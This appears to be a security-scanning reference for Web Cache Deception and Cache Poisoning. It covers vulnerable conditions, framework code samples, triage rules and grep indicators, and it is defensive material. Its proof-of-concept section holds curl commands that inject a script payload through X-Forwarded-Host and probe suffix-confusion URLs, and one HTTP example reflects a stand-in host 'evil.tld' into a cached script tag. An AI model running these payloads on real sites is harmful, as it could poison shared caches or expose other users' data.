---
name: web-cache-deception
description: Web Cache Deception and Cache Poisoning detection — caching of personalized/authenticated responses and cache-key confusion (CWE-525 / CWE-444-adjacent)
---

# Web Cache Deception & Cache Poisoning

A shared cache (CDN, reverse proxy, framework data cache, `Cache-Control: public`) stores a response under a **cache key** and replays it to other clients. Two failure modes, same root cause — the cache key does not match the real authority boundary of the response:

- **Web Cache Deception (WCD)**: a *personalized/authenticated* response gets cached and served to other users (attacker reads victim data, or victim reads attacker-seeded content). Usually triggered by tricking the cache into treating a dynamic URL as a static asset.
- **Cache Poisoning**: an attacker gets a *malicious* response cached under a key that normal users will hit, so the poisoned content (XSS, redirect, defacement) is served to everyone.

This is a configuration/architecture class, framework-agnostic. Detect it from caching directives, cache keys, and what data the cached route returns — not from a single product.

## Where to Look

- Response headers on dynamic/authenticated routes: `Cache-Control`, `Surrogate-Control`, `CDN-Cache-Control`, `Vary`, `Age`, `X-Cache`
- CDN / reverse-proxy rules: "cache by extension", "cache static paths", path-suffix and path-normalization rules
- Framework caches: Next.js SSG/ISR (`getStaticProps` + `revalidate`), App Router `fetch(..., { next: { revalidate }})` / `cache: 'force-cache'`, `Cache-Control` set in route handlers; Nuxt `routeRules`/`nitro` cache; Rails/Django/Spring page or fragment caches
- Cache keys: which request components are (and are NOT) part of the key — path, query, `Host`, `Accept`, `Accept-Encoding`, cookies, auth header

## Web Cache Deception — Vulnerable Conditions

- An **authenticated/personalized** response (`/account`, `/me`, `/dashboard`, `/api/profile`) is cacheable by a shared cache: `Cache-Control: public` (or missing `private`/`no-store`) AND the cache key does not include the session/identity.
- The cache caches by **file extension or static-looking suffix** while the origin ignores the extra suffix and still returns the personalized page:
  - `/<path>/account/nonexistent.css`, `/account;.js`, `/account%0Anonexistent.css`, `/account?.css`, `/account/.css`
  - origin routing strips/ignores the suffix → returns `/account`; CDN sees `.css` → caches it as "static" and serves it to everyone.
- `Vary` omits the dimensions that actually personalize the body (`Vary` lacks `Cookie`/`Authorization`), so one user's cached body is served across identities.

```http
# VULN — personalized page made publicly cacheable, key has no identity dimension
GET /account/wallet.css HTTP/1.1
HTTP/1.1 200 OK
Cache-Control: public, max-age=600     # should be private/no-store for per-user data
# body contains the victim's account data
```

```js
// VULN (Next.js App Router) — per-user data on a force-cached / statically rendered route
export const dynamic = 'force-static';            // or missing `dynamic = 'force-dynamic'`
export default async function Page() {
  const me = await getCurrentUser();              // personalized, yet route is cached/SSG
  return <Dashboard user={me} />;
}
// SAFE — opt the personalized route out of caching
export const dynamic = 'force-dynamic';           // or Cache-Control: private, no-store
```

## Cache Poisoning — Vulnerable Conditions

- An **unkeyed input** influences the response body/headers but is NOT part of the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-For`, `X-Host`, `X-Original-URL`, custom headers, or specific query params the cache strips from the key.
- The reflected unkeyed input reaches a sink: absolute URL / link / redirect built from `Host`/`X-Forwarded-Host` (see `ssrf.md` Host-header class), or reflected into HTML/JS (see `xss.md`).
- **Non-authentication cookie reflected into the body** while the cache keys only on the session/auth cookie: locale/language, currency, theme, A/B-test/feature-flag, and tracking cookies are very commonly reflected into HTML (or used to pick a rendered string) yet excluded from the cache key, so a malicious cookie value (`locale="><script>…`) gets cached and served to everyone — the standard way **self-XSS via a cookie is escalated to stored XSS via cache**. Even when a non-guessable cookie *is* keyed, the response served to **first-time visitors (no cookie set)** can still be poisoned. Treat every cookie that influences the body but is absent from the cache key as a poisoning source.
- **Cache-key bypass via header-name mutation (parser/normalization discrepancy)**: the cache keys on the *literal* header name, but the origin/runtime collapses several spellings to one variable — e.g. CGI/WSGI-style exposure uppercases and maps dashes to underscores (`X-Forwarded-Host` → `HTTP_X_FORWARDED_HOST`), so `X_Forwarded_Host` (underscores), and in some stacks `X.Forwarded.Host` (dots), are read by the backend as the same header but look like a *different, unkeyed* header to the cache. This bypasses a cache key that was built around the dashed name (or even lets a normally-keyed header be smuggled unkeyed). Requires the front end to forward underscore/dot headers (many proxies drop underscores by default). Same idea as path key-confusion below but applied to header names.
- **Validation that is *present but bypassable* on a reflected header (assumed-safe trap)**: an `X-Forwarded-Host` allowlist/regex that only checks the expected domain as a *suffix* (`www.example.com.attacker.com`) or only at the second level (ignoring subdomains, `non-existent.example.com`) passes attacker-influenced values into the reflected/cached sink — see `open_redirect.md`/`host_header_poisoning.md` for the host-validation bypass shapes.
- Cache-key normalization differs from origin parsing (`//`, `/%2e/`, case, trailing chars) → "cache key confusion" lets an attacker poison the key that victims request.

### Unkeyed-input catalog (cache key omits dimension)

| Input | Typical effect if unkeyed |
|-------|---------------------------|
| `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Original-URL` | Absolute URLs, redirects, canonical links poisoned (cross-ref `trust_boundary.md` when header drives auth/routing) |
| Non-auth cookies — `locale`, `lang`, `currency`, `theme`, A/B-test / feature-flag, tracking IDs | Reflected into HTML body but keyed only on the auth cookie → self-XSS escalated to stored XSS via cache |
| `X-HTTP-Method-Override`, `X-Method-Override`, `_method` | Override turns `GET` into an unsupported method → cacheable `405`/`501`; aim at static JS/CSS chunks for CPDoS |
| Mutated header-name spellings — `X_Forwarded_Host` (underscore), `X.Forwarded.Host` (dot) | Read as `X-Forwarded-Host` by origin but unkeyed at the cache → cache-key bypass |
| `utm_*`, tracking/marketing query params | Response body or routing differs but query stripped from CDN cache key |
| Reflected business params — `ref`/affiliate/coupon/`lang` into a hidden form field or default | Logic-flaw poisoning: attacker's value (e.g. referral code) auto-applied for every cached visitor |
| `Accept`, `Accept-Encoding` (when `Vary` missing or not honored by the CDN) | Wrong representation served to victims |

Flag when application code reads/processes the input but CDN/proxy cache key config does not include it.

### Cache-poisoning DoS (empty / error responses)

Attacker seeds a **shared cache entry** with a broken body — empty `{}`, truncated HTML, or cacheable **4xx/5xx** — so all subsequent users receive the poisoned response. Distinct from XSS/redirect poisoning: impact is **denial of service** (see `denial_of_service.md`).

- `Cache-Control: public` or `s-maxage` on error handlers, middleware short-circuits, or JSON data routes that return `{}` under attacker-controlled headers.
- Framework internal routes that return minimal/empty JSON when probed with prefetch or internal headers, yet responses are edge-cacheable.
- **Method-override → cacheable error on static assets (CPDoS "HMO")**: an unkeyed `X-HTTP-Method-Override`/`X-HTTP-Method`/`X-Method-Override`/`_method` makes the origin treat a benign `GET` as `POST`/`DELETE`/`PUT`; the app has no handler for that method on the path and returns a cacheable `404`/`405`/`5xx`. Pointed at a long-TTL static bundle (`/_next/static/chunks/*.js`, `/static/js/*.js`), the cached error replaces the JavaScript for **all** users → the app fails to boot until the entry expires. The most damaging CPDoS targets exactly these high-TTL chunks. SAST/config signal: CDN that caches `4xx`/`5xx` by status (or doesn't restrict cacheable statuses) **and** an origin that honors method-override or other unkeyed request-shaping headers on asset paths.
- **Oversized request header (CPDoS "HHO")**: a **semantic gap in header-size limits** — the cache accepts a larger total request-header size than the origin (e.g. an edge that permits ~20 KB forwarding to an origin/proxy capped at ~8 KB). An attacker pads the request with many junk headers (or one header with an oversized key/value) that passes the cache but trips the origin's limit, which returns a cacheable error (often the *wrong* status: `400 Bad Request`, sometimes `404`) that the cache then stores for everyone. SAST/config signal: cache `large_client_header_buffers` / max-header config **larger** than the origin's, error pages on the oversize path lacking `Cache-Control: no-store`, and the origin returning a *cacheable-by-default* status instead of `431 Request Header Fields Too Large`.
- **Meta/control characters in a request header (CPDoS "HMC")**: a header value containing control characters — `\n`, `\r`, bell `\a`, `\0`, or other illegal bytes — passes an unaware cache unsanitized but causes the origin/WAF to reject the request with a cacheable error. Same outcome as HHO: a malformed-but-forwarded header poisons the entry with an error page. SAST/config signal: caches that neither strip nor key on non-standard/control-char-bearing request headers, plus error responses that are cacheable; related to the request-side of `http_response_splitting.md` (CR/LF in headers).
- **Other unkeyed request-shaping headers**: `Origin`/CORS request headers and hop-by-hop headers (`Connection`, and the headers it names) have all been used to provoke a cacheable origin error while remaining outside the cache key — treat any header the origin *acts on* but the cache *ignores* as a CPDoS source, not only method-override.
- **Root cause — caches storing non-cacheable error codes**: per HTTP caching rules only `404`, `405`, `410`, `501` are heuristically cacheable; `400`/`431`/`5xx` are **not**. Most CPDoS variants depend on a cache that stores a status it shouldn't, *or* an origin that emits a heuristically-cacheable/`200`-with-error-body response on the failure path. Mitigation signals to expect (flag their absence): error responses carry `Cache-Control: no-store`; the origin uses the *correct, non-cached* status (`431` for oversized headers); the CDN restricts cacheable statuses to the RFC-allowed set; and a WAF (if relied on) sits **in front of** the cache, not behind it.
- **`Vary` not honored**: if the response varies by a header the CDN ignores despite listing it in `Vary` (observed with some framework-internal headers), the "negotiated" variant is poisonable — don't assume a `Vary`-listed header is safe.

```http
# VULN — empty JSON cached publicly after middleware short-circuit
HTTP/1.1 200 OK
Cache-Control: public, s-maxage=31536000
Content-Type: application/json
{}
```

### Next.js — framework cache-poisoning vectors

Check `package.json` `"next"` version against known-vulnerable ranges (e.g. middleware prefetch DoS **CVE-2023-46298** in Next.js before **13.5.2**; confirm against installed semver).

- **`x-middleware-prefetch`**: middleware reacts to prefetch header → returns empty `{}` or minimal body that shared cache stores under the victim URL.
- **`__nextDataReq` / data-route confusion**: client data fetches (`/_next/data/...`) cached with wrong key or confused with page route; personalized `getServerSideProps` payload cached as static.
- **RSC / internal invoke headers**: server reads client-supplied `Rsc`, `x-invoke-status`, or `x-invoke-error` and changes response shape without those headers in cache key.
- **SSR + public cache**: `getServerSideProps` / `getServerSideProps`-equivalent routes setting `Cache-Control: public` or `s-maxage` on per-user data without `private`, `no-store`, or correct `Vary`.

```js
// VULN (Pages Router) — personalized SSR response publicly cacheable
export async function getServerSideProps(ctx) {
  const me = await getUser(ctx.req);
  ctx.res.setHeader('Cache-Control', 'public, s-maxage=60, stale-while-revalidate');
  return { props: { me } };
}

// SAFE
ctx.res.setHeader('Cache-Control', 'private, no-store');
```

```js
// VULN (middleware) — branch on prefetch header without opting out of edge cache
export function middleware(req) {
  if (req.headers.get('x-middleware-prefetch')) {
    return NextResponse.json({});
  }
  return NextResponse.next();
}
```

### Nuxt — `/_payload.json` and Nitro cache

Check `package.json` `"nuxt"` version: **CVE-2025-27415** affects Nuxt **3.0.0–3.15.2** (payload route cache confusion via `?poc=/_payload.json` or `#/_payload.json`).

- **`routeRules` / Nitro route cache** on dynamic pages without query string (or hash) in cache key — attacker poisons payload JSON for a high-traffic route.
- Public `cache: { swr, maxAge }` on routes whose body varies by auth cookie or query param omitted from key.

```js
// VULN — cache dynamic route without query in key
export default defineNuxtConfig({
  routeRules: {
    '/account/**': { swr: 3600, cache: { maxAge: 3600 } },  // per-user page
  },
});
```

```http
# VULN — X-Forwarded-Host is reflected into an absolute script src but is NOT in the cache key
GET / HTTP/1.1
X-Forwarded-Host: evil.tld
# response caches: <script src="//evil.tld/app.js"> served to all subsequent users
```

## Safe Patterns

- Personalized/authenticated responses set `Cache-Control: private, no-store` (or `no-cache`) — never `public` on identity-bearing bodies.
- Cache key includes every dimension that varies the body: identity (cookie/auth) for per-user content, and a correct `Vary` for content negotiation.
- CDN caches by an explicit allowlist of truly-static paths, not by a trailing extension; path normalization is identical at cache and origin.
- Absolute URLs / links derived from server config, not from `Host`/`X-Forwarded-*` (cross-ref `ssrf.md`).
- Reflected request inputs are either keyed or removed before caching; no unkeyed header reaches an HTML/redirect sink.

## Business Risk

- Disclosure of another user's authenticated data (PII, tokens, balances) via WCD — often **High/Critical**, unauthenticated, mass-impact.
- Site-wide stored-equivalent XSS / open redirect / defacement via cache poisoning served to all users.
- Cache-key confusion enabling targeted poisoning of high-traffic routes.

## Triage / Severity

- **High/Critical**: cached response contains another identity's sensitive data, or poisoned response delivers XSS/redirect to all users.
- **Medium**: personalized route is cacheable but body has limited sensitivity, or poisoning requires uncommon preconditions.
- **Low/Info**: missing `Vary`/`private` with no demonstrated cross-identity body or reflected sink (defense-in-depth gap).

## FALSE POSITIVE Rules

- Do NOT flag genuinely static, identity-independent assets (`/_next/static/*`, hashed bundles, public images) cached with `public` — that is correct.
- Do NOT flag `public` caching when the cache key provably includes identity (e.g. per-user CDN segmentation, `Vary: Cookie` with an auth cookie in the key).
- Cache poisoning requires an **unkeyed** input reaching a real sink — a reflected header that IS part of the cache key (so only the attacker's own cache entry is affected) is self-poisoning, not a finding.
- Prefer the narrower tag when the reflected-input sink is the primary bug: `xss` for script reflection, `open_redirect` for redirect reflection, `ssrf` for Host-derived server fetches. Use `web_cache_deception` when the *caching of personalized data* or *cross-user cache key confusion* is the core issue.

## Core Principle

A cache is only safe when its key matches the response's true authority boundary. Any response whose body depends on identity, or on an input absent from the cache key, must not be stored in a shared cache.

## Dynamic Test / PoC — web cache deception

**Suffix / extension confusion** on authenticated routes:

```bash
curl -s -D- -H "Cookie: SESSION=victim" "https://TARGET/account/nonexistent.css" | grep -iE 'cache-control|x-cache|age|vary'
curl -s -H "Cookie: SESSION=attacker" "https://TARGET/account/nonexistent.css"
```

Confirmed when a clean session receives another identity's body, or `X-Cache: HIT` / `Age > 0` on a personalized response without identity in the cache key.

### Dynamic Test / PoC — cache poisoning

Distinct from WCD: attacker poisons a shared cache entry so all users receive malicious content.

**Identify cache behavior:**

```bash
curl -s -D- "https://TARGET/" | grep -iE 'x-cache|age|cache-control|cf-cache|vary'
```

**Probe unkeyed headers** reflected but absent from cache key:

```bash
curl -s "https://TARGET/" -H "X-Forwarded-Host: evil.tld" | grep "evil.tld"
curl -s "https://TARGET/" -H "X-Forwarded-Scheme: nothttps" | grep -i redirect
```

**Confirm poisoning** — use a cache buster on the poison request, then fetch the canonical URL without the header:

```bash
curl -s "https://TARGET/?cb=$(date +%s)" \
  -H "X-Forwarded-Host: evil.tld\"><script>alert(1)</script>" -D- | grep -i x-cache

curl -s "https://TARGET/" | grep "alert(1)"
```

Poisoning is confirmed when the second (header-free) request returns `X-Cache: HIT` (or `Age > 0`) and still contains the injected payload.

## SAST grep indicators

**Next.js prefetch / data routes / SSR cache headers:**
```bash
rg -n "x-middleware-prefetch|__nextDataReq|x-invoke-status|x-invoke-error|\bRsc\b" --glob "*.{js,ts,tsx,mjs}"
rg -n "getServerSideProps" . | rg -n "Cache-Control|s-maxage|public"
rg -n '"next"\s*:\s*"(1[0-2]\.|13\.[0-4]\.)' package.json   # adjust range to advisory for installed major
```

**Nuxt payload / Nitro cache:**
```bash
rg -n "_payload\.json|/_payload" .
rg -n "routeRules|nitro.*cache|swr\s*:" nuxt.config.{ts,js,mjs}
rg -n '"nuxt"\s*:\s*"(\^)?3\.(0\.|[1-9]|1[0-5])\.' package.json
```

**Unkeyed headers / query params processed but not keyed:**
```bash
rg -n "x-forwarded-host|x-forwarded-scheme|x-original-url|req\.headers\['x-host" --glob "*.{js,ts,py,rb,go,java}"
rg -n "utm_|_method|req\.query\." . | rg -v "cache|key|vary"
```

**Cacheable empty/error responses (DoS class):**
```bash
rg -n "Cache-Control.*public|s-maxage" . | rg -n "json\(\{\}\)|status\s*\(\s*(4|5)\d\d\s*\)|NextResponse\.json\(\{\}\)"
```

**CPDoS (HHO/HMC/HMO) — error-page caching + header-size gap:**
```bash
# Error handlers / pages missing no-store (poisonable on failure path)
rg -n "errorhandler|error_page|@app\.errorhandler|res\.status\((4|5)\d\d\)|abort\(" . | rg -v "no-store|no-cache|private"
# Header-size limits that may exceed the origin (HHO) and method-override trust (HMO)
rg -n "large_client_header_buffers|client_header_buffer_size|maxHeaderSize|max-http-header-size|LimitRequestFieldSize|MaxRequestBytes" .
rg -n "X-HTTP-Method-Override|X-HTTP-Method|X-Method-Override|methodOverride|_method" .
```

## Related references

- `denial_of_service.md` — cache-poisoning DoS as availability impact; prefer `web_cache_deception` when caching misconfiguration is the root cause.
- `trust_boundary.md` — unkeyed `X-Forwarded-*` / `Host` trusted for URL generation or routing decisions.

---

## Go Web Cache Deception Detection

Commonly affected languages: Go only for automated wildcard-route + cache-header detection. Java/Spring, JavaScript/Express, and CDN-config patterns require heuristic/manual review per the sections above. Cache poisoning via unkeyed headers (CWE-444-adjacent), Next.js `force-static` misconfiguration, and CDN suffix-normalization remain manual.

### Detection pattern

Flag **wildcard route registration combined with cacheable responses** — a structural proxy for "any URL suffix may hit one handler that sets caching headers."

**Sinks (framework-specific):**

1. **`net/http.HandleFunc`** — route pattern matches `%/` (wildcard prefix) AND the handler function writes a `Cache-Control` response header via `http.ResponseWriter.Header().Set`.
2. **`github.com/gofiber/fiber` / `fiber/v2`** — route pattern matches `%/*%` (catch-all).
3. **`github.com/go-chi/chi/v5`** — catch-all route pattern `%/*%`.
4. **`github.com/julienschmidt/httprouter`** — catch-all route pattern `%/*%`.

**Sources:** not taint-based — configuration/registration site of the wildcard handler.

**Sanitizers:** none modeled automatically — mitigations must be verified manually (`Cache-Control: private, no-store` on authenticated handlers, strict static-only cache rules, URL validation rejecting fake extensions).

### Good / bad examples

**BAD:** authenticated admin handler registered at `/adminusers/` with in-memory session keyed by `r.RequestURI`; template cache keyed by request path — attacker appends `.css` to a personalized URL and shared cache stores the admin body.

```go
http.HandleFunc("/adminusers/", ShowAdminPageCache)
// handler sets sessionMap[r.RequestURI] and renders user-specific template
```

**SAFE:** non-cacheable response headers on identity-bearing routes; no catch-all that maps arbitrary suffixes to personalized handlers; static assets on dedicated non-personalized paths only.

**Vulnerable router patterns (Fiber / Chi / httprouter samples):** catch-all `/*` or `/{path:*}` routes that serve dynamic content without opting out of caching — same class as wildcard `HandleFunc`.

### Mapping static signals to manual WCD tests

| Static signal | Manual confirmation |
|---|---|
| Wildcard Go route + `Cache-Control` write in handler | Request `/account/nonexistent.css` — does origin return personalized body? |
| Fiber/Chi catch-all registration | Check middleware cache headers and CDN "cache by extension" rules |
| No automated signal | Still test authenticated routes for `Cache-Control: public` and missing `Vary: Cookie` |

### Common False Alarms

- **Wildcard static file servers** (`/assets/*` only serving hashed bundles) may match the route pattern but are not WCD if responses are identity-independent — confirm body content before escalating.
- **Catch-all registration alerts even when handler sets `no-store`** for Fiber/Chi/httprouter sinks — the `net/http` variant requires a cache header write; others do not.
- **Expect false positives** on intentional catch-all API routers; false negatives when caching is configured only at CDN/proxy layer (outside Go source).
- **No cross-user proof in static analysis** — architecture risk must be confirmed with cached response containing victim session data.
